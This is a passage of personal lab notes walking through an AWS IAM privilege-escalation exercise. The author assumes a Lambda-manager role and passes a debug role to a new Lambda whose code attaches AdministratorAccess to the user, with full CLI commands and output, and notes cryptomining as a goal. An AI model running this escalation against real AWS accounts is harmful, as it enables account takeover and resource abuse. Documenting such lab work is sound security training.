        "CreateDate": "2025-05-24T22:24:17+00:00"
    }
}
```
- Obesrve
    - Lambda * dig into
    - Ability to PassRole permissions if assume this role

###### Potential attack plan
1. Create Assume the CG-Manager Role
2. Create a Lmabda Function and pass the CG-Debug role to it.
3. Have the Lambda Function provide us with administrator access when it runs.
4. We do whatever we want to like running crytominers, 

###### Create Assume the CG-Manager Role
- Assume role command  creating
```bash
aws sts assume-role --role-arn arn:aws:iam::381491847637:role/cg-lambdaManager-role-cgidbsi5rpua6g --role-session-name lambdamanager --profile chris
{
    "Credentials": {

    
    }
}
```
- Added the profile 
```bash
aws configure --profile lambdamanager
echo ' = ' >> ~/.aws/credentials
```
- View the assumed role
```bash
aws sts get-caller-identity --profile lambdamanager
```
- Lambda fucntion name it as lambda_function.py
```bash
cat lambda_function2.py
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='chris-cgidbsi5rpua6g',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Policy attached!"
```
- Zip the file we can upload only the .zip file
```bash
zip -r lambda_function.py.zip lambda_function.py
```
- Create afucntion in the AWS
```bash
aws lambda create-function --function-name admin_function --runtime python3.9 --role arn:aws:iam::381491847637:role/cg-debug-role-cgidbsi5rpua6g --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdamanager --region us-east-1
{
    "FunctionName": "admin_function",
    "FunctionArn": "arn:aws:lambda:us-east-1:381491847637:function:admin_function",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::381491847637:role/cg-debug-role-cgidbsi5rpua6g",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 904,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2025-05-25T01:47:40.780+0000",
    "CodeSha256": "o37kLQTqQ50K+iGqmtN4ubh0Eg4d5lrSJMOWzgk3cQg=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "26ba712f-c958-41e1-a428-698510d8245b",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    },
    "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
    },
    "RuntimeVersionConfig": {
        "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:b0187a72e2a0474a536ecdeed24a9131d82aa650b5a85f12efc5c2b09011a8b5"
    }
}
```
- Invoke this function 
```bash
aws lambda invoke --function-name admin_function out2.txt --profile lambdamanager --region us-east-1
{
    "StatusCode": 200,
    "FunctionError": "Unhandled", # You don't the error, I'm using May be I'm using Acloudguru lab 
    "ExecutedVersion": "$LATEST"
}
```
- Checking used policied
```bash
aws iam list-attached-user-policies --user-name chris-cgidbsi5rpua6g --profile chris
{
    "AttachedPolicies": [
        {
            # Here Will get AdministratorAccess, I'm using AcloudGuru lab blocking
        }
        {
            "PolicyName": "cg-chris-policy-cgidbsi5rpua6g",
            "PolicyArn": "arn:aws:iam::381491847637:policy/cg-chris-policy-cgidbsi5rpua6g"
        }
    ]
}
```